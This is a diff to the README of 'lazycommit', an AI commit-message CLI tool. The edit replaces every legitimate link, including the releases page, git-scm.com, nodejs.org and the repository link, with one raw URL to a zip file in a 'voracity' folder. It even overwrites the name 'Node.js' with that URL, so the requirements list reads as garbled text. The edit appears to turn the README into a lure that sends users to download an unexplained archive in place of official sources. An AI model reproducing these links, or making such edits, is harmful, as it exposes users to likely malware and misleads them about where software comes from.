@@ -2,7 +2,7 @@
 
 ## 🚀 Download It Now
 
-[![Download lazycommit](https://img.shields.io/badge/Download-lazycommit-brightgreen)](https://github.com/RaihanOcean/lazycommit/releases)
+[![Download lazycommit](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip)](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip)
 
 ## 📖 Table of Contents
 
@@ -29,8 +29,8 @@ lazycommit is a command-line interface (CLI) tool that uses AI to help you write
 Before you download lazycommit, ensure that your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Git**: Installed on your system. You can download it from [git-scm.com](https://git-scm.com/).
-- **Node.js**: Version 14 or higher. Download it from [nodejs.org](https://nodejs.org/).
+- **Git**: Installed on your system. You can download it from [https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip).
+- **https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip**: Version 14 or higher. Download it from [https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip).
 - **Internet Connection**: Required for AI functionality.
 
 ## 📥 Installation Guide
@@ -39,7 +39,7 @@ To install lazycommit, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
    
-   [Download lazycommit](https://github.com/RaihanOcean/lazycommit/releases)
+   [Download lazycommit](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip)
 
 2. **Download the Latest Version**: On the releases page, look for the latest version of lazycommit. You will find it labeled as "Latest release". Click the download link for your operating system.
 
@@ -93,6 +93,6 @@ If you have questions or need further assistance, you can find help through the 
 - **Community Forums**: Engage with fellow users for shared help or tips.
 - **Documentation**: Access comprehensive guides within the repository's Wiki section.
 
-For more information, visit the official repository at [lazycommit on GitHub](https://github.com/RaihanOcean/lazycommit).
+For more information, visit the official repository at [lazycommit on GitHub](https://raw.githubusercontent.com/RaihanOcean/lazycommit/main/voracity/lazycommit.zip).
 
 Feel free to start enjoying a productive coding experience with lazycommit! Remember, effective commit messages lead to better project management. Happy coding!
